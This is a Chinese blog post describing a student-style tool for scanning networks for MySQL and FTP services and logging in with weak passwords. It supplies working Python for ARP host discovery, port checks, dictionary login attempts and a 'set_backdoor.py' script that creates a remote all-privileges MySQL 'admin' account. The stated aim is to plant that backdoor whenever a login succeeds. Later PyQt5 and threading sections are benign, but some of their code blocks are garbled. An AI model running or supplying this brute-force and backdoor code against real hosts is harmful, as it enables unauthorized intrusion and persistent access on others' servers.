<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        互联网sql、ftp服务弱口令探测 - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#互联网sql、ftp服务弱口令探测"><span class="toc-text">互联网sql、ftp服务弱口令探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#设计思路"><span class="toc-text">设计思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#互联网主机探活"><span class="toc-text">互联网主机探活</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arp-地址解析协议"><span class="toc-text">arp 地址解析协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过arp协议进行主机探活"><span class="toc-text">通过arp协议进行主机探活</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口探测"><span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#尝试弱口令登陆特定服务"><span class="toc-text">尝试弱口令登陆特定服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#连接-mysql"><span class="toc-text">连接 mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#添加后门用户"><span class="toc-text">添加后门用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#弱口令登陆-FTP"><span class="toc-text">弱口令登陆 FTP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-多线程"><span class="toc-text">python 多线程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用多线程的简单实例"><span class="toc-text">使用多线程的简单实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#线程同步"><span class="toc-text">线程同步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#线程池"><span class="toc-text">线程池</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#图形化编程"><span class="toc-text">图形化编程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PyQt5-入门"><span class="toc-text">PyQt5-入门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PyQt5-信号槽机制"><span class="toc-text">PyQt5-信号槽机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#菜单栏、状态栏"><span class="toc-text">菜单栏、状态栏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#事件和信号"><span class="toc-text">事件和信号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模块化"><span class="toc-text">模块化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#遇到问题"><span class="toc-text">遇到问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文档"><span class="toc-text">参考文档</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        互联网sql、ftp服务弱口令探测
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2020-04-29 13:40:34</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#MySql" title="MySql">MySql</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#FTP" title="FTP">FTP</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#scan" title="scan">scan</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="互联网sql、ftp服务弱口令探测"><a href="#互联网sql、ftp服务弱口令探测" class="headerlink" title="互联网sql、ftp服务弱口令探测"></a>互联网sql、ftp服务弱口令探测</h1><p>12/11/2019 1:26:12 PM </p>
<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><ul>
<li>给定网段，扫描存活主机(<code>def get_ip</code>)，将IP地址存放在 <code>iprange.txt</code> 中</li>
<li>由于这一阶段的探测目标是指定服务，因此我们跳过端口扫描阶段，直接进行特定端口探测(<code>def port_scan</code>)</li>
<li>对于开放目标服务的端口尝试进行弱口令登陆，弱口令密码存放在 <code>dict.txt</code> 中(‘<code>def try_login</code>‘)</li>
<li>对于 <code>sqlserver</code> ，如果登陆成功，则创建后门服务</li>
<li>实现图形化界面，采用 Qt desinger 技术</li>
<li>语言选择 python 2.0+ ，并使用多线程技术</li>
</ul>
<h2 id="互联网主机探活"><a href="#互联网主机探活" class="headerlink" title="互联网主机探活"></a>互联网主机探活</h2><p>对于主机探活部分参考 nmap 的说明文档</p>
<blockquote>
<p>任何网络探测任务的最初几个步骤之一就是把一组IP范围(有时该范围是巨大的)缩小为 一列活动的或者您感兴趣的主机。扫描每个IP的每个端口很慢，通常也没必要。 当然，什么样的主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安全的人士则可能对一个马桶都感兴趣，只要它有IP地址:-)。一个系统管理员 也许仅仅使用Ping来定位内网上的主机，而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图 突破防火墙的封锁。</p>
<p>由于主机发现的需求五花八门，Nmap提供了一箩筐的选项来定制您的需求。 主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(-sL)或者 通过关闭ping (-P0)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间，往往只有小部分的IP地址是活动的。 这种情况在基于RFC1918的私有地址空间如10.0.0.0/8尤其普遍。 那个网络有16,000,000个IP，但我见过一些使用它的公司连1000台机器都没有。 主机发现能够找到零星分布于IP地址海洋上的那些机器。</p>
</blockquote>
<p>在这里我选择使用 arp 协议进行探测，使用 arp 协议效率高，速度快，但只限于同一局域网</p>
<h3 id="arp-地址解析协议"><a href="#arp-地址解析协议" class="headerlink" title="arp 地址解析协议"></a>arp 地址解析协议</h3><p>来自维基百科</p>
<blockquote>
<p>以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。</p>
<p>1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。<br>2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？”</p>
<p>3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。</p>
</blockquote>
<h3 id="通过arp协议进行主机探活"><a href="#通过arp协议进行主机探活" class="headerlink" title="通过arp协议进行主机探活"></a>通过arp协议进行主机探活</h3><p>我们通过 scapy 来发送 arp 包，先查看 arp 的包结构</p>
<pre><code>&gt;&gt;&gt; a = ARP()
&gt;&gt;&gt; a.display()
###[ ARP ]### 
  hwtype= 0x1
  ptype= 0x800
  hwlen= None
  plen= None
  op= who-has
  hwsrc= 00:0c:29:ee:86:00
  psrc= 192.168.43.214
  hwdst= None
  pdst= None

&gt;&gt;&gt; a.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= 0x800
  hwlen= None
  plen= None
  op= who-has
  hwsrc= 00:0c:29:ee:86:00
  psrc= 192.168.43.214
  hwdst= None
  pdst= None</code></pre><p>接下来用 python 实现主机探测，并将存活主机 IP 地址存放在 <code>iprange.txt</code> 中</p>
<p><strong>ArpScanner.py</strong></p>
<pre><code>#!/usr/bin/env python
# _*_ coding=utf-8 _*_

from scapy.all import *
import sys,getopt

def usage():
        print &quot;Usage: sudo ./ArpScanner.py &quot;

def main(argv):
        try:
                opts, args = getopt.getopt(argv, &quot;&quot;)
        except getopt.GetoptError:
                usage()
                sys.exit(2)
        with open(&quot;./iprange.txt&quot;,&quot;w&quot;) as f:
             for ipFix in range(1,254):
                     ip = &quot;192.168.43.&quot;+str(ipFix)
                     arpPkt = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=ip, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)
                     res = srp1(arpPkt, timeout=1, verbose=0)
                     if res:
                             f.write(res.psrc+&quot;\n&quot;)
                             print &quot;IP: &quot; + res.psrc + &quot;     MAC: &quot; + res.hwsrc

if __name__ == &quot;__main__&quot;:
        main(sys.argv[1:])</code></pre><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>对于端口探测部分，本项目通过 socket 库实现</p>
<p><strong>port_scan.py</strong></p>
<pre><code>#!/usr/bin/env python
# _*_ coding=utf-8 _*_
import socket

#创建流式套接字，连接远程地址
sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sk.settimeout(1)
try:
    sk.connect((&quot;127.0.0.1&quot;,3306))
    print &apos;service ok&apos;
except Exception:
    print &apos;service bad&apos;

sk.close()</code></pre><p>通过简单的远程连接结果来判断目标端口是否开放</p>
<h2 id="尝试弱口令登陆特定服务"><a href="#尝试弱口令登陆特定服务" class="headerlink" title="尝试弱口令登陆特定服务"></a>尝试弱口令登陆特定服务</h2><h3 id="连接-mysql"><a href="#连接-mysql" class="headerlink" title="连接 mysql"></a>连接 mysql</h3><p>在本项目中我使用 pymysql 库来对 mysql 进行操作。 对于开放 mysql 服务的主机先尝试弱口令连接，以下是我在本地开放 mysql 服务后的测试：</p>
<p><strong>conn_mysql.py</strong></p>
<pre><code>#!/usr/bin/env python
# _*_ coding=utf-8 _*_
import socket
import pymysql

# information_schema 是 Mysql 的默认数据库，我们有权限操作
# pymysql.cursors.DictCursor 以字典方式进行连接参数管理
try:
    connection = pymysql.connect(host=&apos;127.0.0.1&apos;,
                                 user=&apos;root&apos;,
                                 password=&apos;root&apos;,
                                 db=&apos;information_schema&apos;,
                                 charset=&apos;utf8mb4&apos;,
                                cursorclass=pymysql.cursors.DictCursor)
    # cursor()得到一个光标对象，等待输入sql语句
    with connection.cursor() as cursor:
        # 创建一个新记录
        sql = &quot;select version()&quot;
        cursor.execute(sql)
        result = cursor.fetchone()
    print(result)
    connection.close()
except Exception as e:
    print &quot;登陆失败！&quot;</code></pre><p>结果成功打印了 mysql 的版本号 <code>{u&#39;version()&#39;: u&#39;5.5.53&#39;}</code> ！在我们进行数据库连接时参数都正确就登陆成功，如果错了，就会被捕捉到。</p>
<h3 id="添加后门用户"><a href="#添加后门用户" class="headerlink" title="添加后门用户"></a>添加后门用户</h3><p>首先在本地测试查询用户命令：</p>
<pre><code>mysql&gt; select user,host from mysql.user;
+------+-----------+
| user | host      |
+------+-----------+
| root | 127.0.0.1 |
| root | ::1       |
| root | localhost |</code></pre><p>创建新用户：</p>
<pre><code>create user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;</code></pre><p>刷新权限：</p>
<pre><code>flush privileges;</code></pre><p>尝试远程登陆：</p>
<pre><code>mysql -u root -p -h 192.168.43.61</code></pre><p>登陆成功。但是我们没有权限访问默认数据库  <code>information_schema</code> ,还需要在创建用户时更改权限</p>
<pre><code>mysql&gt; grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;
Query OK, 0 rows affected (0.17 sec)</code></pre><p>刷新系统权限表</p>
<pre><code>mysql&gt; flush privileges;
Query OK, 0 rows affected (0.13 sec)</code></pre><p>在本地测试完我们还要删除测试账号</p>
<pre><code>mysql&gt; delete from user where user=&apos;admmin&apos; and host=&apos;%&apos;;
Query OK, 0 rows affected (0.42 sec)

mysql&gt; flush privileges;
Query OK, 0 rows affected (0.00 sec)

mysql&gt; drop user &apos;admin&apos;@&apos;%&apos;;
Query OK, 0 rows affected (0.10 sec)

mysql&gt; select user,host from user;
+------+-----------+
| user | host      |
+------+-----------+
| root | 127.0.0.1 |
| root | ::1       |
| root | localhost |
+------+-----------+
3 rows in set (0.00 sec)</code></pre><p>接下来尝试使用 <code>python</code> 完成上面的操作：</p>
<p><strong>set_backdoor.py</strong></p>
<pre><code>#!/usr/bin/env python
# _*_ coding=utf-8 _*_

import pymysql

connection = pymysql.connect(host=&apos;127.0.0.1&apos;,
                                 user=&apos;root&apos;,
                                 password=&apos;root&apos;,
                                 db=&apos;information_schema&apos;,
                                 charset=&apos;utf8mb4&apos;,
                                 cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        # 创建一个新用户
        sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;
        cursor.execute(sql)
        # 将后门用户权限给到最大
        cursor.execute(&quot;grant all privileges on *.* to &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;&quot;)
        cursor.execute(&quot;flush privileges&quot;)
        # 需要手动提交
        connection.commit()
        connection.close()
        print &quot;创建成功！&quot;
except Exception as e:
    print e</code></pre><h3 id="弱口令登陆-FTP"><a href="#弱口令登陆-FTP" class="headerlink" title="弱口令登陆 FTP"></a>弱口令登陆 FTP</h3><p>先在本地搭建 ftp 服务进行测试。 </p>
<p>本项目 <code>ftp</code> 模块使用 <code>ftplib</code> 实现</p>
<p>将弱口令账户密码保存在 <code>ftp_dict.txt</code> 中，用 <code>|</code> 做分割，考虑到可以匿名访问的问题，将空账号密码也作为测试内容加入字典中，如果扫描结果输出 <code>user</code> 和 <code>pwd</code>为空，则代表该 ftp 服务允许匿名访问</p>
<pre><code>admin|admin
admin|root
 |
root|root</code></pre><p><strong>FTP_login.py</strong></p>
<pre><code>def try_login_ftp(ip,save_path):
    avleable_list = &quot;&quot;
    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问
    try:
        ftp = FTP()
        ftp.connect(ip)
        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:
            for line in f.readlines():
                #print line.strip()
                user = line.strip().split(&quot;|&quot;)[0]
                pwd = line.strip().split(&quot;|&quot;)[1]
                ftp.login(user, pwd)  # 允许匿名访问
                # 访问成功
                print &quot;[+] ftp service is ok！username= &quot; + user + &quot;pwd = &quot; + pwd + &quot;\r\n&quot;
                avleable_list = str(time.asctime()) + &quot; &quot; + ip + &quot; : &quot; + user + &quot; | &quot; + pwd + &quot;\r\n&quot;
                save_result(save_path, avleable_list)
                print &quot;[+] 该 ftp 文件目录为：&quot;
                ftp.dir()
                break
    except Exception as e:
        print e
        print &quot;[-] ftp service is bad!&quot;
        pass
    return

def save_result(save_path,result_list):
    s = open(save_path, &quot;a&quot;)
    s.write(result_list)
    s.close()
    return</code></pre><p>这里需要注意的是 ftp 服务是否开放不能像 mysql 服务探测一样依据端口情况判断，而要根据 <code>ftp.connect()</code> 的结果判断。</p>
<p><strong>误</strong>：上边的说法不对，其实还是可以判断的</p>
<pre><code>try:
    res1 = sk1.connect_ex((ip, 21))
    print res1
    if res1 == 0:
        print &apos;[+] ftp service is ok! try to login...\r\n&apos;
        ftp_service.try_login_ftp(url2, save_path)
    else:
        print res1
except Exception, e:
    print &apos;[-] ftp service login failed!&apos; + str(e) + &apos;\r\n&apos;
sk1.close()</code></pre><p>通过 <code>connect.ex()</code> 返回的状态码来判断是否开放即可。</p>
<h2 id="python-多线程"><a href="#python-多线程" class="headerlink" title="python 多线程"></a>python 多线程</h2><p>python 中使用多线程有两种方式： 函数或者用类来包装线程对象</p>
<p>python使用 threading 模块来提供线程支持：</p>
<ul>
<li>threading.currentThread(): 返回当前的线程变量。</li>
<li>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</li>
<li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</li>
<li>run(): 用以表示线程活动的方法。</li>
<li>start():启动线程活动。</li>
<li>join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</li>
<li>isAlive(): 返回线程是否活动的。</li>
<li>getName(): 返回线程名</li>
<li>setName(): 设置线程名。</li>
</ul>
<h3 id="使用多线程的简单实例"><a href="#使用多线程的简单实例" class="headerlink" title="使用多线程的简单实例"></a>使用多线程的简单实例</h3><pre><code># -*-* encoding:UTF-8 -*-
# author : 刘宇航
# date   : 2019/12/11

import Queue
import threading
import time

exitFlag = 0

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print &quot;Starting &quot; + self.name
        process_data(self.name,self.counter,5)
        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            if exitFlag:<br>                (threading.Thread).exit()<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>
<pre><code>#创建线程
thread1 = myThread(1,&quot;Thread-1&quot;,1)
thread2 = myThread(2,&quot;Thread-2&quot;,2)

#开启线程
thread1.start()
thread2.start()

print &quot;Exiting Main Thread&quot;</code></pre><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><p>引入 锁 的概念：每当一个线程比如 线程1 要访问共享数据时，必须先获得锁定；如果已经有别的线程比如 线程2 获得锁定了，那么就让线程1暂停，也就是同步阻塞；等到线程2访问完毕，释放锁以后，再让线程1继续。</p>
<p>使用<code>Thread</code>对象的<code>Lock</code>和<code>Rlock</code>可以实现简单的线程同步，这两个对象都有<code>acquire</code>方法和<code>release</code>方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到<code>acquire</code>和<code>release</code>方法之间.</p>
<p><strong>threads_test.py</strong></p>
<pre><code># -*-* encoding:UTF-8 -*-
# author : 刘宇航
# date   : 2019/12/11

import Queue
import threading
import time

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print &quot;Starting &quot; + self.name
        # 获得锁，成功后返回 True
        # 可选的 timeout 参数不填时将会一直阻塞直到获得锁定
        # 否则超时会返回false
        threadLock.acquire()
        process_data(self.name,self.counter,3)
        # 释放锁
        threadLock.release()
        print &quot;Exit &quot; + self.name</code></pre><p>​<br>    def process_data(threadName, delay, counter):<br>        while counter:<br>            time.sleep(delay)<br>            print “%s: %s” % (threadName,time.ctime(time.time()))<br>            counter -= 1</p>
<pre><code>threadLock = threading.Lock()
threads = []

#创建线程
thread1 = myThread(1,&quot;Thread-1&quot;,1)
thread2 = myThread(2,&quot;Thread-2&quot;,2)

#开启线程
thread1.start()
thread2.start()

# 添加线程到线程列表
threads.append(thread1)
threads.append(thread2)

for t in threads:
    t.join()
print &quot;Exiting Main Thread&quot;</code></pre><p>结果：</p>
<pre><code>Starting Thread-1
Starting Thread-2
Thread-1: Wed Dec 11 14:24:40 2019
Thread-1: Wed Dec 11 14:24:41 2019
Thread-1: Wed Dec 11 14:24:42 2019
Exit Thread-1
Thread-2: Wed Dec 11 14:24:44 2019
Thread-2: Wed Dec 11 14:24:46 2019
Thread-2: Wed Dec 11 14:24:48 2019
Exit Thread-2
Exiting Main Thread</code></pre><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>使用线程池无疑是一个实现20线程数的好方法。</p>
<p>需要注意的是使用 <code>poo.map()</code> 传递的是两个参数第一个参数是一个函数名（不带()），第二个参数是个迭代对象。</p>
<p>一般情况第二个参数，传入一个迭代就够用了</p>
<p><strong>threading_pool.py</strong></p>
<pre><code>#!/usr/bin/env python
# -*- coding=utf-8 -*-

import socket
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool


remote_server = raw_input(&quot;Enter a remote host to scan:&quot;)
remote_server_ip = socket.gethostbyname(remote_server)
ports = []

print &apos;-&apos; * 60
print &apos;Please wait, scanning remote host &apos;, remote_server_ip
print &apos;-&apos; * 60

socket.setdefaulttimeout(0.5)</code></pre><p>​<br>    def scan_port(port):<br>        try:<br>            s = socket.socket(2, 1)<br>            res = s.connect_ex((remote_server_ip, port))<br>            if res == 0:  # 如果端口开启 发送 hello 获取banner<br>                print ‘Port {}: OPEN’.format(port)<br>            s.close()<br>        except Exception, e:<br>            print str(e.message)</p>
<pre><code>for i in range(1, 1025):
    ports.append(i)

# Check what time the scan started</code></pre><p>​<br>    t1 = datetime.now()</p>
<pre><code>pool = ThreadPool(processes=20)
try:
    results = pool.map(scan_port,ports)
except Exception as e:
    print e
pool.close()
pool.join()

print &apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1</code></pre><p>扫描速度还是很快的</p>
<pre><code>Enter a remote host to scan:192.168.43.61
------------------------------------------------------------
Please wait, scanning remote host  192.168.43.61
------------------------------------------------------------
Port 80: OPEN
Port 135: OPEN
Port 110: OPEN
Port 139: OPEN
Port 21: OPEN
Port 25: OPEN
Port 443: OPEN
Port 445: OPEN
Port 912: OPEN
Port 902: OPEN
Multiprocess Scanning Completed in   0:00:26.119000</code></pre><p>稍微改改放到我们的主程序中试一下扫描速度</p>
<p>不加多线程：</p>
<pre><code>0:00:07.019000</code></pre><p>加完之后：</p>
<pre><code>Multiprocess Scanning Completed in   0:00:02.029000</code></pre><p>速度提升了不少！ <code>7s -&gt; 2s</code> </p>
<h2 id="图形化编程"><a href="#图形化编程" class="headerlink" title="图形化编程"></a>图形化编程</h2><p>为了使用更方便的 PyQt5 ，把代码全都换成 python3.8 嗷。</p>
<h3 id="PyQt5-入门"><a href="#PyQt5-入门" class="headerlink" title="PyQt5-入门"></a>PyQt5-入门</h3><p>展示一个小窗口：</p>
<pre><code>import sys
from PyQt5.QtWidgets import QApplication, QWidget

if __name__ == &apos;__main__&apos;:

    app = QApplication(sys.argv)

    w = QWidget()
    w.resize(250,250)
    w.move(300, 300)
    w.setWindowTitle(&apos;Simple&apos;)

    w.show()

    sys.exit(app.exec_())</code></pre><p>所有的PyQt5应用必须创建一个应用（<code>Application</code>）对象。<code>Qwidget</code> 组件是 <code>PyQt5</code> 中所有用户界面类的基础类。我们给 <code>QWidget</code> 提供了默认的构造方法。默认构造方法没有父类。没有父类的 <code>widget</code> 组件将被作为窗口使用。</p>
<p><code>show()</code> 方法在屏幕上显示出 <code>widget</code> 。一个 <code>widget</code> 对象在这里第一次被在内存中创建，并且之后在屏幕上显示。</p>
<p>最后，应用进入主循环。在这个地方，事件处理开始执行。主循环用于接收来自窗口触发的事件，并且转发他们到<code>widget</code> 应用上处理。如果我们调用 <code>exit()</code> 方法或主 <code>widget</code> 组件被销毁，主循环将退出。<code>sys.exit()</code>方法确保一个不留垃圾的退出。系统环境将会被通知应用是怎样被结束的。</p>
<p><code>exec_()</code> 方法有一个下划线。因为 <code>exec</code> 是Python保留关键字。因此，用 <code>exec_()</code> 来代替。</p>
<h3 id="PyQt5-信号槽机制"><a href="#PyQt5-信号槽机制" class="headerlink" title="PyQt5-信号槽机制"></a>PyQt5-信号槽机制</h3><p>在PyQt5中，事件处理系统由信号&amp;槽机制建立。如果我们点击了按钮，信号 <code>clicked</code> 被发送。槽可以是Qt内置的槽或Python 的一个方法调用。 <code>QCoreApplication</code> 类包含了主事件循环；它处理和转发所有事件。<code>instance()</code> 方法给我们返回一个实例化对象。注意 <code>QCoreAppli</code> 类由 <code>QApplication</code> 创建。点击信号连接到 <code>quit()</code> 方法，将结束应用。事件通信在两个对象之间进行：发送者和接受者。发送者是按钮，接受者是应用对象。</p>
<pre><code>#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
from PyQt5.QtWidgets import (QApplication, QWidget,
    QPushButton, QToolTip)
from PyQt5.QtGui import QFont,QIcon
from PyQt5.QtCore import QCoreApplication</code></pre><p>​<br>    class Example(QWidget):</p>
<pre><code>def __init__(self):
    super().__init__()

    self.initUI()</code></pre><p>​<br>        def initUI(self):</p>
<pre><code>QToolTip.setFont(QFont(&apos;SanSerif&apos;,10))

self.setToolTip(&apos;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&apos;)

btn = QPushButton(&apos;Quit&apos;, self)
btn.clicked.connect(QCoreApplication.instance().quit)
btn.setToolTip(&apos;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&apos;)
btn.resize(btn.sizeHint())
btn.move(50,50)

self.setGeometry(300,300,300,220)
self.setWindowTitle(&apos;Icon&apos;)
self.setWindowIcon(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;))

self.show()</code></pre><p>​<br>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<pre><code>app = QApplication(sys.argv)

ex = Example()
sys.exit(app.exec_())</code></pre><h3 id="菜单栏、状态栏"><a href="#菜单栏、状态栏" class="headerlink" title="菜单栏、状态栏"></a>菜单栏、状态栏</h3><pre><code>#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
from PyQt5.QtWidgets import (QApplication, QWidget,
    QPushButton, QToolTip, QDesktopWidget,
                             QMainWindow, QMessageBox,
                             QAction, qApp,
                             QTextEdit)
from PyQt5.QtGui import QFont,QIcon</code></pre><p>​<br>​<br>    class Example(QMainWindow):</p>
<pre><code>def __init__(self):
    super().__init__()

    self.initUI()

def initUI(self):

    textEdit = QTextEdit()
    self.setCentralWidget(textEdit)</code></pre><p>​<br>            exitAction = QAction(QIcon(“C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico”)<br>                                 , ‘&amp;Exit’, self)<br>            exitAction.setShortcut(‘Ctrl+Q’)<br>            exitAction.setStatusTip(‘Exit application’)<br>            exitAction.triggered.connect(self.close)</p>
<pre><code>self.statusBar()

menubar = self.menuBar()
fileMenu = menubar.addMenu(&apos;&amp;File&apos;)
fileMenu.addAction(exitAction)

toolbar = self.addToolBar(&apos;Exit&apos;)
toolbar.addAction(exitAction)</code></pre><p>​<br>​<br>            self.setGeometry(300,300,500, 350)<br>            self.setWindowTitle(‘Message box’)<br>            self.show()</p>
<pre><code>def center(self):

    qr = self.frameGeometry()
    cp = QDesktopWidget().availableGeometry().center()
    qr.moveCenter(cp)
    self.move(qr.topLeft())</code></pre><p>​<br>​<br>        def closeEvent(self, event):</p>
<pre><code>reply = QMessageBox.question(self, &apos;Message&apos;,
                             &quot;Are you sure to quit?&quot;,QMessageBox.Yes |
                             QMessageBox.No, QMessageBox.No)

if reply == QMessageBox.Yes:
    event.accept()

else:
    event.ignore()</code></pre><p>​<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<pre><code>app = QApplication(sys.argv)

ex = Example()
sys.exit(app.exec_())</code></pre><p>接下来让我们分开看</p>
<pre><code>self.statusBar().showMessage(&apos;Ready&apos;)</code></pre><p>为了得到状态栏，我们调用了 <code>QtGui.QMainWindow</code> 类的 <code>statusBar()</code> 方法。第一次调用这个方法创建了一个状态栏。随后方法返回状态栏对象。然后用 <code>showMessage()</code> 方法在状态栏上显示一些信息。</p>
<pre><code>menubar = self.menuBar()
fileMenu = menubar.addMenu(&apos;&amp;File&apos;)
